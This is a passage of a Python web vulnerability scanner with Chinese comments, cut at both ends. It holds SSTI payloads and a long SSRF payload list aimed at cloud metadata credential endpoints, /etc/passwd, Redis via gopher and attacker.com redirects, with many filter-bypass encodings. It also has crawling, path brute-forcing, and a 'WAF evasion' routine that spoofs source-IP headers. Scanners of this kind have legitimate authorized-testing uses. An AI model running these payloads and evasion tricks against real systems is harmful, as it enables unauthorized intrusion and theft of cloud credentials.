            "${request.getServletContext().getServerInfo()}",  # 服务器信息
            "${request.getServletContext().getAttribute(\"id\")}",  # 上下文属性
            "${request.getSession().getAttribute(\"id\")}",  # Session属性
            "${request.getRequestDispatcher(\"/\").forward(request,response)}",  # 请求转发
            "${request.getRequestDispatcher(\"/\").include(request,response)}",  # 请求包含
            "${pageContext.setAttribute(\"id\",request.getParameter(\"id\"))}",  # PageContext
            "${pageContext.getServletContext().getRealPath(\"/\")}",  # PageContext获取路径
            "${pageContext.getServletContext().getResource(\"/\")}",  # PageContext获取资源
            "${pageContext.getServletContext().getServerInfo()}",  # PageContext获取服务器信息
            "${pageContext.getServletContext().getAttribute(\"id\")}",  # PageContext获取属性
            "${pageContext.getSession().getAttribute(\"id\")}",  # PageContext获取Session属性
            "${pageContext.getRequest().getParameter(\"id\")}",  # PageContext获取参数
            "${pageContext.getResponse().getWriter().print(\"test\")}",  # PageContext输出
        ],
        "patterns": [
            r"49", r"343", r"14",
            r"uid=\d+\([^)]+\)", r"gid=\d+\([^)]+\)",
            r"subclass of", r"class '__main__",
            r"os\.popen", r"SECRET_KEY =",
            r"<Config", r"<module",
            r"built-in function", r"<class",
            r"java\.lang\.Runtime",
            r"freemarker\.template\.utility",
            r"ProcessBuilder",
            r"ChildProcess"
        ],
        "methods": ["GET", "POST"],
        "reproduce": "在输入字段提交模板表达式并检查输出",
        "severity": "高危",
        "category": "注入漏洞",
        "validation": {
            "os_command": True,
            "file_read": True
        },
        "remediation": "避免在模板中使用用户输入，使用沙箱环境执行模板。"
    },
    "服务器端请求伪造(SSRF)": {
        "payloads": [
            # 基本探测
            "?url=http://169.254.169.254/latest/meta-data/",
            "?image=http://localhost:22",
            
            # 协议处理
            "?server=file:///etc/passwd",
            "?load=php://input",
            "?fetch=gopher://127.0.0.1:6379/_*1%0d%0a$7%0d%0aCOMMAND%0d%0a",
            "?uri=dict://localhost:11211/stat",
            "?get=ftp://attacker.com:21",
            
            # 内部服务
            "?api=http://localhost:8080/internal",
            "?path=http://169.254.169.254/latest/user-data",
            "?host=http://metadata.google.internal/computeMetadata/v1beta1/",
            "?service=http://localhost:3306",
            "?connect=http://admin:password@localhost",
            "?url=http://localhost:80",
            "?url=http://127.0.0.1:80",
            "?url=http://[::1]:80/",
            
            # 绕过技术
            "?url=http://0177.0.0.1/",  # 八进制IP
            "?url=http://0x7f.0.0.1/",  # 十六进制IP
            "?url=http://2130706433/",   # 十进制IP
            "?url=http://127.0.0.1.xip.io/",
            "?url=http://127.0.0.1.nip.io/",
            "?url=http://localhost@attacker.com",
            "?url=http://attacker.com#@localhost",
            "?url=http://attacker.com?@localhost",
            
            # 高级
            "?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/",
            "?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
            "?url=http://metadata.azure.microsoft/",
            "?url=http://100.100.100.200/latest/meta-data/",
            
            # 高级WAF绕过
            "?url=http://[::ffff:169.254.169.254]/",  # IPv6兼容IPv4
            "?url=http://[::ffff:a9fe:a9fe]/",  # IPv6十六进制
            "?url=http://[0:0:0:0:0:ffff:127.0.0.1]/",  # IPv6映射
            "?url=http://0/",  # 零地址
            "?url=http://127.1/",  # 短IP
            "?url=http://127.0.1/",  # 短IP
            "?url=http://127.0.0.0.1/",  # 多点IP
            "?url=http://127.0.0.1:80@attacker.com/",  # 用户信息
            "?url=http://attacker.com/127.0.0.1",  # 路径包含
            "?url=http://attacker.com?redirect=http://127.0.0.1",  # 参数包含
            "?url=http://attacker.com#http://127.0.0.1",  # 片段包含
            "?url=//127.0.0.1",  # 无协议
            "?url=///127.0.0.1",  # 多余斜杠
            "?url=////127.0.0.1",  # 多余斜杠
            "?url=http:/127.0.0.1",  # 少斜杠
            "?url=http:127.0.0.1",  # 无斜杠
            "?url=http://127.0.0.1%2e",  # 点结尾
            "?url=http://127.0.0.1%2e%2e",  # 多点结尾
            "?url=http://127.0.0.1%00",  # 空字节
            "?url=http://127.0.0.1%23.attacker.com",  # 片段
            "?url=http://127.0.0.1%3f.attacker.com",  # 查询
        ],
        "patterns": [
            r"AMAZON_META_DATA", r"root:.*:0:0:", 
            r"SSH", r"EC2",
            r"instance-id", r"public-keys",
            r"hostname", r"iam",
            r"security-credentials", r"computeMetadata",
            r"MySQL", r"Redis",
            r"Memcached", r"Internal Server",
            r"Access Denied", r"Unauthorized",
            r"access_token", r"expires_in",
            r"Bearer", r"FLAG{",
            r"HTTP/1.1 200 OK"
        ],
        "methods": ["GET"],
        "reproduce": "发送包含内部URL的请求并检查响应",
        "severity": "高危",
        "category": "服务端漏洞",
        "validation": {
            "dns_oob": True,
            "http_oob": True
        },
        "remediation": "限制URL访问协议（仅HTTP/HTTPS），验证用户输入的URL，使用网络分段隔离内部服务。"
    }
}

class IntelligentScanner:
    """智能扫描引擎核心类 - 性能优化版"""
    def __init__(self, target_url):
        self.target_url = target_url.rstrip('/')
        self.session = self.create_session()
        self.connection_pool = self.create_connection_pool()
        self.tech_stack = {}
        self.start_time = time.time()
        self.stats = {
            "requests_sent": 0,
            "vulnerabilities_found": 0,
            "paths_discovered": 0,
            "js_files_analyzed": 0,
            "api_endpoints_scanned": 0,
            "avg_latency": 0.5,  # 平均延迟初始值
            "success_rate": 1.0   # 成功率
        }
        self.response_cache = {}
        self.homepage_content = ""
        self.homepage_hash = ""
        self.homepage_lock = threading.Lock()
        
    def create_session(self):
        """创建带连接池的会话"""
        session = requests.Session()
        adapter = requests.adapters.HTTPAdapter(
            pool_connections=CONFIG["connection_pool_size"],
            pool_maxsize=CONFIG["connection_pool_size"]
        )
        session.mount('http://', adapter)
        session.mount('https://', adapter)
        session.headers.update({
            "User-Agent": random.choice(CONFIG["user_agents"]),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
            "Accept-Language": "en-US,en;q=0.5",
            "Connection": "keep-alive",
            "Upgrade-Insecure-Requests": "1"
        })
        return session
    
    def create_connection_pool(self):
        """创建连接池"""
        return {
            "available": [self.create_session() for _ in range(CONFIG["connection_pool_size"])],
            "in_use": []
        }
    
    def get_session(self):
        """从连接池获取会话"""
        while True:
            if self.connection_pool["available"]:
                session = self.connection_pool["available"].pop()
                self.connection_pool["in_use"].append(session)
                return session
            time.sleep(0.01)
    
    def release_session(self, session):
        """释放会话回连接池"""
        self.connection_pool["in_use"].remove(session)
        self.connection_pool["available"].append(session)
    
    def send_request(self, url, method="GET", params=None, retry=0):
        """发送HTTP请求（带重试和连接池）"""
        # 检查缓存
        cache_key = f"{method}:{url}:{json.dumps(params) if params else ''}"
        if CONFIG["cache_responses"] and cache_key in self.response_cache:
            return self.response_cache[cache_key]
        
        session = self.get_session()
        try:
            start_time = time.time()
            if method == "GET":
                response = session.get(url, params=params, timeout=CONFIG["timeout"])
            elif method == "POST":
                response = session.post(url, data=params, timeout=CONFIG["timeout"])
            elif method == "PUT":
                response = session.put(url, data=params, timeout=CONFIG["timeout"])
            elif method == "DELETE":
                response = session.delete(url, timeout=CONFIG["timeout"])
            else:
                response = session.get(url, timeout=CONFIG["timeout"])
            
            elapsed = time.time() - start_time
            self.stats["requests_sent"] += 1
            
            # 更新平均延迟和成功率
            self.stats["avg_latency"] = (self.stats["avg_latency"] * 0.9) + (elapsed * 0.1)
            self.stats["success_rate"] = (self.stats["success_rate"] * 0.95) + (0.05 if response.status_code < 500 else 0)
            
            # 缓存响应
            if CONFIG["cache_responses"]:
                self.response_cache[cache_key] = response
            
            return response
        except requests.exceptions.RequestException as e:
            self.stats["success_rate"] *= 0.95  # 降低成功率
            if retry < CONFIG["max_retries"]:
                time.sleep(0.5 * (retry + 1))  # 指数退避
                return self.send_request(url, method, params, retry+1)
            return None
        finally:
            self.release_session(session)

class AdvancedSecurityScanner:
    def __init__(self, target_url, proxy=None, rate_limit=0.1, waf_evasion=True, 
                 api_scan=True, js_analysis=True, sensitive_data=True, 
                 bruteforce_params=True, tech_detection=True):
        self.target_url = target_url.rstrip('/')
        self.scanner = IntelligentScanner(target_url)
        self.session = self.scanner.session
        
        # 应用代理设置
        if proxy:
            self.session.proxies = {"http": proxy, "https": proxy}
            print(f"{Fore.CYAN}[*] 使用代理: {proxy}")
        
        # 配置扫描参数
        self.rate_limit = rate_limit
        self.waf_evasion = waf_evasion
        self.api_scan = api_scan
        self.js_analysis = js_analysis
        self.sensitive_data = sensitive_data
        self.bruteforce_params = bruteforce_params
        self.tech_detection = tech_detection
        
        self.found_paths = []
        self.vulnerabilities = []
        self.api_endpoints = []
        self.tech_stack = {}
        self.start_time = time.time()
        self.progress = 0
        self.total_tests = 0
        self.completed_tests = 0
        self.scan_active = True
        self.visited_links = set()
        self.js_files = set()
        self.security_headers = {}
        self.last_request_time = 0
        self.page_hashes = {}  # 页面哈希用于去重
        self.similarity_cache = {}  # 相似度缓存
        self.progress_lock = threading.Lock()
        self.path_queue = queue.Queue()
        self.batch_size = CONFIG["batch_size"]
        self.resource_usage = {"cpu": 0, "memory": 0}
        
        # 创建输出目录
        if not os.path.exists(CONFIG["output_dir"]):
            os.makedirs(CONFIG["output_dir"])
    
    def is_static_resource(self, url):
        """检查是否是静态资源"""
        parsed = urlparse(url)
        path = parsed.path.lower()
        return any(path.endswith(ext) for ext in CONFIG["resource_blacklist"])
    
    @lru_cache(maxsize=1000)
    def is_page_similar(self, content1, content2):
        """使用simhash检查页面相似度"""
        if not content1 or not content2:
            return False
            
        # 生成simhash
        try:
            hash1 = simhash.Simhash(content1)
            hash2 = simhash.Simhash(content2)
            
            # 计算海明距离
            distance = hash1.distance(hash2)
            
            # 距离越小越相似，阈值设置为5
            return distance < 5
        except:
            return False
    
    def get_resource_usage(self):
        """获取系统资源使用情况"""
        self.resource_usage["cpu"] = psutil.cpu_percent()
        self.resource_usage["memory"] = psutil.virtual_memory().percent
        return self.resource_usage
    
    def adaptive_rate_limiting(self):
        """自适应速率限制"""
        if self.rate_limit <= 0:
            return
            
        # 获取当前资源使用情况
        usage = self.get_resource_usage()
        cpu_usage = usage["cpu"]
        mem_usage = usage["memory"]
        
        # 根据资源使用情况调整延迟
        resource_factor = 1.0
        if cpu_usage > CONFIG["max_cpu_usage"] or mem_usage > CONFIG["max_memory_usage"]:
            resource_factor = 2.0  # 资源紧张时降低速度
        
        # 根据成功率调整延迟
        success_factor = max(0.5, min(2.0, 1.0 / max(0.1, self.scanner.stats["success_rate"])))
        
        # 计算实际延迟
        adaptive_delay = max(0.01, min(0.5, self.rate_limit * resource_factor * success_factor))
        
        current_time = time.time()
        elapsed = current_time - self.last_request_time
        
        if elapsed < adaptive_delay:
            sleep_time = adaptive_delay - elapsed
            time.sleep(sleep_time)
            
        self.last_request_time = time.time()
    
    def dynamic_thread_adjustment(self):
        """增强型动态线程调整"""
        if not CONFIG["dynamic_threads"]:
            return CONFIG["max_threads"]
        
        # 获取系统资源使用情况
        usage = self.get_resource_usage()
        cpu_usage = usage["cpu"]
        mem_usage = usage["memory"]
        
        # 基于系统负载调整
        cpu_factor = max(0.5, min(1.5, (100 - cpu_usage) / 100))
        mem_factor = max(0.5, min(1.5, (100 - mem_usage) / 100))
        
        # 基于扫描进度调整
        progress_factor = 1.0
        if self.total_tests > 0:
            progress_factor = min(1.5, 0.5 + (self.completed_tests / self.total_tests))
        
        # 基于网络延迟调整
        latency_factor = 1.0
        if self.scanner.stats["requests_sent"] > 10:
            avg_latency = self.scanner.stats.get("avg_latency", 0.5)
            latency_factor = max(0.5, min(1.5, 0.5 / max(0.1, avg_latency)))
        
        # 计算最终线程数
        base_threads = min(CONFIG["max_threads"], 10)
        dynamic_threads = int(base_threads * progress_factor * cpu_factor * mem_factor * latency_factor)
        
        return max(CONFIG["min_threads"], min(CONFIG["max_threads"], dynamic_threads))
    
    def validate_vulnerability(self, url, vuln_type, payload, method, result):
        """增强型漏洞验证"""
        vuln_data = VULNERABILITY_CHECKS.get(vuln_type, {})
        validation_config = vuln_data.get("validation", {})
        
        # SQL注入验证
        if vuln_type == "SQL注入" and validation_config.get("time_based"):
            return self.validate_time_based_sqli(url, payload, method)
        
        # XSS验证
        if vuln_type == "跨站脚本(XSS)" and validation_config.get("tag_validation"):
            return self.validate_xss_tag(url, payload, method)
        
        # 路径遍历验证
        if vuln_type == "路径遍历" and validation_config.get("file_existence"):
            return self.validate_path_traversal(url, payload, method)
        
        # 默认验证方法
        return self.default_validation(url, vuln_type, payload, method)
    
    def validate_time_based_sqli(self, url, payload, method):
        """验证基于时间的SQL注入"""
        try:
            # 发送正常请求测量响应时间
            start_time = time.time()
            self.scanner.send_request(url, method, {})
            normal_time = time.time() - start_time
            
            # 发送包含SLEEP的payload
            time_payload = payload.replace("SLEEP(5)", "SLEEP(10)") if "SLEEP" in payload else payload + " AND SLEEP(10)--"
            
            start_time = time.time()
            self.scanner.send_request(url, method, {"param": time_payload})
            attack_time = time.time() - start_time
            
            # 如果攻击响应时间明显更长，则验证成功
            if attack_time > normal_time + 8:
                return True
        except:
            pass
        return False
    
    def validate_xss_tag(self, url, payload, method):
        """验证XSS标签注入"""
        try:
            # 发送请求
            response = self.scanner.send_request(url, method, {"param": payload})
            if not response:
                return False
                
            # 检查payload是否被反射
            soup = BeautifulSoup(response.text, 'html.parser')
            tags = soup.find_all()
            
            for tag in tags:
                if payload in str(tag):
                    # 检查是否在脚本标签内
                    if tag.name == "script" and payload in tag.string:
                        return True
                    # 检查是否在事件处理器内
                    for attr, value in tag.attrs.items():
                        if attr.startswith("on") and payload in value:
                            return True
        except:
            pass
        return False
    
    def default_validation(self, url, vuln_type, payload, method):
        """默认漏洞验证方法"""
        try:
            # 发送原始请求作为基线
            baseline = self.scanner.send_request(url, method)
            
            # 发送包含payload的请求
            if method == "GET":
                test_url = url + ("&" if "?" in url else "?") + payload
                test_response = self.scanner.send_request(test_url)
            else:
                test_response = self.scanner.send_request(url, method, data=payload)
            
            if not test_response:
                return False
            
            # 比较基线响应和测试响应
            diff_ratio = self.compare_responses(baseline, test_response)
            
            # 如果响应差异超过阈值，认为是漏洞
            return diff_ratio > 0.3
        except:
            return False
    
    def compare_responses(self, response1, response2):
        """比较两个响应的差异度"""
        if response1 is None or response2 is None:
            return 0.0
        
        # 比较状态码
        if response1.status_code != response2.status_code:
            return 1.0
        
        # 比较内容长度
        len1 = len(response1.content) if response1.content else 0
        len2 = len(response2.content) if response2.content else 0
        len_diff = abs(len1 - len2) / max(len1, len2, 1)  # 避免除以0
        
        # 比较内容相似度
        if len1 == 0 or len2 == 0:
            return len_diff
        
        # 使用simhash计算相似度
        try:
            hash1 = simhash.Simhash(response1.text) if response1.text else 0
            hash2 = simhash.Simhash(response2.text) if response2.text else 0
            similarity = 1 - (hash1.distance(hash2) / 128) if hash1 and hash2 else 0
        except:
            similarity = 0
        
        # 综合差异度
        diff_ratio = (1 - similarity) * 0.7 + len_diff * 0.3
        return diff_ratio
    
    def test_vulnerability(self, url, vuln_type, payload, method):
        """测试特定漏洞 - 修复响应对象问题"""
        try:
            # 应用WAF规避技术
            self.waf_evasion_techniques()
            
            # 发送请求
            if method == "GET":
                test_url = url + ("&" if "?" in url else "?") + payload
                response = self.scanner.send_request(test_url)
            else:
                response = self.scanner.send_request(url, method, data=payload)
            
            if not response:
                return None
                
            # 检查响应是否匹配漏洞特征
            vuln_data = VULNERABILITY_CHECKS.get(vuln_type, {})
            patterns = vuln_data.get("patterns", [])
            for pattern in patterns:
                if re.search(pattern, response.text, re.IGNORECASE):
                    return {
                        "url": url,
                        "type": vuln_type,
                        "payload": payload,
                        "method": method,
                        "status": response.status_code,
                        "response": response,
                        "reproduce": vuln_data.get("reproduce", ""),
                        "severity": vuln_data.get("severity", "中危"),
                        "category": vuln_data.get("category", "通用漏洞")
                    }
        except Exception as e:
            return None
        return None
    
    def waf_evasion_techniques(self):
        """WAF规避技术"""
        if not self.waf_evasion:
            return
            
        # 随机延迟
        time.sleep(random.uniform(0.05, 0.3))
        
        # 随机切换User-Agent
        self.session.headers["User-Agent"] = random.choice(CONFIG["user_agents"])
        
        # 添加随机请求头
        random_headers = {
            "X-Forwarded-For": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Originating-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-IP": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "X-Remote-Addr": f"{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}",
            "Referer": "https://www.google.com/",
            "Accept-Encoding": "gzip, deflate, br"
        }
        self.session.headers.update(random_headers)
    
    def smart_vulnerability_testing(self, path_entry):
        """智能漏洞测试策略 - 优化性能"""
        url = path_entry["url"]
        vulnerabilities_found = []
        context = {
            "url": url,
            "status": path_entry["status"],
            "content_type": path_entry.get("content_type", "")
        }
        
        # 根据内容类型排除不必要的测试
        content_type = context["content_type"].lower()
        if "image/" in content_type or "font/" in content_type:
            return vulnerabilities_found
        
        # 智能选择漏洞类型
        vuln_priority = {
            "SQL注入": 0.9,
            "跨站脚本(XSS)": 0.8,
            "路径遍历": 0.7,
            "命令注入": 0.6,
            "服务器端请求伪造(SSRF)": 0.5,
            "服务器端模板注入(SSTI)": 0.4
        }
        
        # 根据响应特征调整优先级
        if "text/html" in content_type:
            vuln_priority["跨站脚本(XSS)"] = 0.95
        elif "application/json" in content_type:
            vuln_priority["SQL注入"] = 0.95
        
        # 根据技术栈调整
        if "WordPress" in self.tech_stack:
            vuln_priority["SQL注入"] = 0.95
            vuln_priority["路径遍历"] = 0.85
        elif "Spring Boot" in self.tech_stack:
            vuln_priority["服务器端模板注入(SSTI)"] = 0.85
        
        # 应用快速扫描模式
        fast_mode = CONFIG["fast_mode"] or len(self.found_paths) > CONFIG["quick_scan_threshold"]
        
        for vuln_type, priority in sorted(vuln_priority.items(), key=lambda x: x[1], reverse=True):
            # 跳过低优先级漏洞
            if fast_mode and priority < 0.6:
                continue
                
            vuln_data = VULNERABILITY_CHECKS.get(vuln_type, {})
            payloads = vuln_data["payloads"]
            
            # 快速模式下只测试前3个payload
            if fast_mode:
                payloads = payloads[:3]
                
            for payload in payloads:
                for method in vuln_data["methods"]:
                    # 应用WAF规避技术
                    self.waf_evasion_techniques()
                    self.adaptive_rate_limiting()
                    
                    result = self.test_vulnerability(url, vuln_type, payload, method)
                    if result:
                        # 高级漏洞验证
                        if self.validate_vulnerability(url, vuln_type, payload, method, result):
                            result["validated"] = True
                            result["confidence"] = "高"
                            result["remediation"] = vuln_data.get("remediation", "")
                            print(f"{Fore.RED}[!] 已验证漏洞: {vuln_type} @ {url} (方法: {method})")
                        else:
                            result["validated"] = False
                            result["confidence"] = "中"
                            print(f"{Fore.YELLOW}[!] 潜在漏洞: {vuln_type} @ {url} (方法: {method})")
                        
                        vulnerabilities_found.append(result)
                        
                        # 发现漏洞后增加同类型测试深度
                        if not fast_mode:
                            payloads = vuln_data["payloads"][:10]  # 测试更多payload
        
        return vulnerabilities_found
    
    def detect_tech_stack(self, response):
        """检测技术栈"""
        if not self.tech_detection:
            return
            
        content = response.text
        headers = response.headers
        
        for tech, patterns in TECH_FINGERPRINTS.items():
            for pattern in patterns:
                if re.search(pattern, content, re.IGNORECASE) or any(re.search(pattern, str(h), re.IGNORECASE) for h in headers.values()):
                    if tech not in self.tech_stack:
                        self.tech_stack[tech] = []
                    self.tech_stack[tech].append(response.url)
                    print(f"{Fore.CYAN}[*] 检测到技术栈: {tech} @ {response.url}")
                    break
    
    def load_wordlist(self):
        """加载默认路径字典"""
        # 实际应用中应从文件加载
        common_paths = [
            "admin", "login", "wp-admin", "wp-login.php", 
            "backup", "config", "api", "graphql", "rest", 
            "user", "users", "profile", "account", "settings",
            "test", "debug", "console", "actuator", "env", 
            "phpinfo.php", "info.php", ".git", ".env", "robots.txt",
            "sitemap.xml", ".well-known/security.txt"
        ]
        return common_paths
    
    def test_path(self, path):
        """测试单个路径"""
        if not self.scan_active:
            return
            
        url = urljoin(self.target_url, path)
        try:
            self.adaptive_rate_limiting()
            response = self.scanner.send_request(url)
            if response:
                # 保存有效路径
                if response.status_code < 400:
                    self.found_paths.append({
                        "url": url,
                        "status": response.status_code,
                        "length": len(response.content),
                        "content_type": response.headers.get("Content-Type", "")
                    })
                
                # 检测技术栈
                self.detect_tech_stack(response)
        except Exception as e:
            pass
        finally:
            # 确保计数增加
            with self.progress_lock:
                self.completed_tests += 1
    
    def crawl_site(self, start_url):
        """高效爬取网站收集路径和JS文件"""
        from collections import deque
        queue = deque([(start_url, 0)])
        domain = urlparse(start_url).netloc
        base_url = f"{urlparse(start_url).scheme}://{domain}"
        
        # 获取主页内容作为相似度基准
        try:
            homepage_response = self.scanner.send_request(start_url)
            if homepage_response:
                self.scanner.homepage_content = homepage_response.text
        except:
            pass
        
        while queue and len(self.visited_links) < CONFIG["max_paths"]:
            url, depth = queue.popleft()
            if depth > CONFIG["crawl_depth"] or self.is_static_resource(url):
                continue
                
            if url in self.visited_links:
                continue
                
            try:
                self.adaptive_rate_limiting()
                response = self.scanner.send_request(url)
                if response is None:
                    continue
                    
                # 检查页面相似度避免重复内容
                content_hash = hashlib.md5(response.content).hexdigest()
                if content_hash in self.page_hashes:
                    # 如果页面内容完全相同，跳过
                    continue
                    
                # 检查页面相似度
                is_similar = False
                for existing_content in self.page_hashes.values():
                    if self.is_page_similar(response.text, existing_content):
                        is_similar = True
                        break
                        
                if is_similar:
                    continue
                    
                self.visited_links.add(url)
                self.page_hashes[url] = response.text
                
                # 保存有效路径
                if response.status_code < 400:
                    self.found_paths.append({
                        "url": url,
                        "status": response.status_code,
                        "length": len(response.content),
                        "content_type": response.headers.get("Content-Type", "")
                    })
                
                # 解析HTML获取新链接
                soup = BeautifulSoup(response.text, 'html.parser')
                for link in soup.find_all('a', href=True):
                    href = link['href']
                    if href.startswith(('javascript:', 'mailto:', 'tel:', '#')) or href == '':
                        continue
                    full_url = urljoin(url, href)
                    parsed = urlparse(full_url)
                    
                    # 只处理同域名的链接
                    if parsed.netloc == domain and full_url not in self.visited_links:
                        if not self.is_static_resource(full_url) and depth + 1 <= CONFIG["crawl_depth"]:
                            queue.append((full_url, depth + 1))
                
                # 收集JS文件
                for script in soup.find_all('script', src=True):
                    js_url = urljoin(url, script['src'])
                    if js_url.endswith('.js') and js_url not in self.js_files and not self.is_static_resource(js_url):
                        self.js_files.add(js_url)
                
                # 检测技术栈
                self.detect_tech_stack(response)
                
                print(f"{Fore.BLUE}[*] 爬取: {url} (深度: {depth})")
                
            except Exception as e:
                continue
    
    def analyze_js_file(self, js_url):
        """分析JS文件寻找API端点 - 优化性能"""
        try:
            self.adaptive_rate_limiting()
            response = self.scanner.send_request(js_url)
            if not response:
                return
                
            # 使用正则表达式高效查找API端点
            api_patterns = [
                r"['\"](?:/api(?:/v\d+)?|/graphql|/rest|/soap|/jsonrpc|/xmlrpc)['\"]",
                r"(?:api|endpoint|baseURL|url):\s*['\"]([^'\"]+)['\"]",
                r"fetch\(['\"]([^'\"]+)['\"]",
                r"axios\.(?:get|post|put|delete)\(['\"]([^'\"]+)['\"]",
                r"\.ajax\([^\)]*url:\s*['\"]([^'\"]+)['\"]"
            ]
            
            for pattern in api_patterns:
                matches = re.finditer(pattern, response.text)
                for match in matches:
                    endpoint = match.group(1) if match.groups() else match.group(0)
                    if endpoint.startswith(('http://', 'https://')):
                        # 如果是完整URL，只保留路径部分
                        endpoint = urlparse(endpoint).path
                    
                    if endpoint and endpoint not in self.api_endpoints:
                        self.api_endpoints.append(endpoint)
                        print(f"{Fore.MAGENTA}[*] 从JS发现API端点: {endpoint}")
        
        except Exception as e:
            pass
    
    def scan_paths(self):
        """优化后的路径扫描"""
        # 先爬取网站
        print(f"{Fore.CYAN}[*] 开始爬取目标网站: {self.target_url}")
        self.crawl_site(self.target_url)
        print(f"{Fore.GREEN}[*] 爬取完成，发现 {len(self.js_files)} 个JS文件")
        
        # 分析JS文件
        if self.js_analysis and self.js_files:
            print(f"{Fore.CYAN}[*] 开始分析JS文件...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.dynamic_thread_adjustment()) as executor:
                executor.map(self.analyze_js_file, self.js_files)
        
        # 分析API端点
        if self.api_scan and self.api_endpoints:
            print(f"{Fore.MAGENTA}[*] 开始分析API端点...")
            with concurrent.futures.ThreadPoolExecutor(max_workers=self.dynamic_thread_adjustment()) as executor:
                api_results = list(executor.map(self.analyze_api_endpoint, self.api_endpoints))
            
            # 收集API漏洞
            for api_info in api_results:
                if api_info and api_info['vulnerabilities']:
                    for vuln in api_info['vulnerabilities']:
                        self.vulnerabilities.append({
                            "url": vuln['endpoint'],
                            "type": vuln['type'],
                            "payload": vuln.get('payload', ''),
                            "method": vuln['method'],
                            "status": vuln['status'],
                            "reproduce": f"使用{vuln['method']}方法请求API端点，并在参数{vuln.get('parameter', '')}中使用payload",
                            "severity": vuln['severity'],
                            "category": "API漏洞",
                            "validated": True,
                            "confidence": "高",
                            "remediation": VULNERABILITY_CHECKS.get(vuln['type'], {}).get("remediation", "")
                        })
        
        # 添加参数暴力破解
        if self.bruteforce_params:
            print(f"{Fore.BLUE}[*] 开始参数暴力破解...")
            self.bruteforce_parameters()
        
        wordlist = list(set(self.load_wordlist() + list(self.visited_links)))
        print(f"{Fore.CYAN}[*] 开始路径扫描，目标: {self.target_url}")
        print(f"{Fore.CYAN}[*] 加载了 {len(wordlist)} 个路径进行测试")
        
        # 限制最大扫描路径数
        if len(wordlist) > CONFIG["max_paths"]:
            wordlist = wordlist[:CONFIG["max_paths"]]
            print(f"{Fore.YELLOW}[!] 路径过多，限制为前 {CONFIG['max_paths']} 个路径")
        
        self.total_tests = len(wordlist)
        self.completed_tests = 0
        self.scan_active = True
        
        # 启动进度显示线程
        progress_thread = threading.Thread(target=self.show_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        # 使用动态线程数
        max_threads = self.dynamic_thread_adjustment()
        print(f"{Fore.CYAN}[*] 使用动态线程数: {max_threads}")
        
        # 使用更高效的执行器
        with concurrent.futures.ThreadPoolExecutor(
            max_workers=max_threads,
            thread_name_prefix="ScannerWorker"
        ) as executor:
            # 批量提交任务
            batches = [wordlist[i:i + self.batch_size] for i in range(0, len(wordlist), self.batch_size)]
            
            for batch in batches:
                futures = []
                for path in batch:
                    if not self.scan_active:
                        break
                    futures.append(executor.submit(self.test_path, path))
                
                for future in concurrent.futures.as_completed(futures):
                    if not self.scan_active:
                        break
                    try:
                        future.result()
                    except Exception as e:
                        print(f"{Fore.RED}[!] 任务执行出错: {str(e)}")
        
        self.scan_active = False
        print(f"\n{Fore.GREEN}[*] 路径扫描完成，发现 {len(self.found_paths)} 个有效路径")
        return len(self.found_paths)
    
    def detect_vulnerabilities(self):
        """检测所有已发现路径的漏洞 - 优化性能"""
        print(f"{Fore.CYAN}[*] 开始漏洞检测...")
        self.total_tests = len(self.found_paths)
        self.completed_tests = 0
        self.scan_active = True
        
        # 启动进度显示线程
        progress_thread = threading.Thread(target=self.show_progress)
        progress_thread.daemon = True
        progress_thread.start()
        
        # 使用动态线程数
        max_threads = self.dynamic_thread_adjustment()
        print(f"{Fore.CYAN}[*] 使用动态线程数: {max_threads}")
        
        with concurrent.futures.ThreadPoolExecutor(max_workers=max_threads) as executor:
            # 批量提交任务
            batches = [self.found_paths[i:i + self.batch_size] for i in range(0, len(self.found_paths), self.batch_size)]
            
            for batch in batches:
                futures = []
                for path in batch:
                    if not self.scan_active:
                        break
                    futures.append(executor.submit(self.smart_vulnerability_testing, path))
                
                for future in concurrent.futures.as_completed(futures):
                    if not self.scan_active:
                        break
                    vulnerabilities = future.result()
                    if vulnerabilities:
                        self.vulnerabilities.extend(vulnerabilities)
                    with self.progress_lock:
                        self.completed_tests += 1
        
        self.scan_active = False
        print(f"\n{Fore.GREEN}[*] 漏洞检测完成，发现 {len(self.vulnerabilities)} 个潜在漏洞")
    
    def classify_vulnerabilities(self):
        """对漏洞进行分类"""
        classified = {}
        
        for vuln_type in VULNERABILITY_CHECKS.keys():
            classified[vuln_type] = []
        
        for vuln in self.vulnerabilities:
            vuln_type = vuln['type']
            if vuln_type in classified:
                classified[vuln_type].append(vuln)
            else:
                if "其他" not in classified:
                    classified["其他"] = []
                classified["其他"].append(vuln)
        
        # 按严重程度排序
        sorted_classified = {}
        severity_order = ["critical", "high", "medium", "low"]
        
        for severity in severity_order:
            for vuln_type, severity_level in CONFIG["vulnerability_categories"].items():
                if severity_level == severity:
                    if vuln_type in classified and classified[vuln_type]:
                        sorted_classified[vuln_type] = classified[vuln_type]
        
        # 添加其他类型
        if "其他" in classified and classified["其他"]:
            sorted_classified["其他"] = classified["其他"]
            
        return sorted_classified
    
    def generate_html_report(self):
        """增强型HTML报告生成"""
        # 对漏洞进行分类
        classified_vulns = self.classify_vulnerabilities()
        
        # 创建报告目录
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        report_dir = os.path.join(CONFIG["output_dir"], f"scan_report_{timestamp}")
        if not os.path.exists(report_dir):
            os.makedirs(report_dir)
        
        # 生成报告文件路径
        report_path = os.path.join(report_dir, "report.html")
        
        # 生成报告内容
        report = f"""<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Web安全扫描报告 - {self.target_url}</title>
    <style>
        body {{ font-family: Arial, sans-serif; line-height: 1.6; color: #333; max-width: 1200px; margin: 0 auto; padding: 20px; }}
        h1, h2, h3, h4 {{ color: #2c3e50; }}
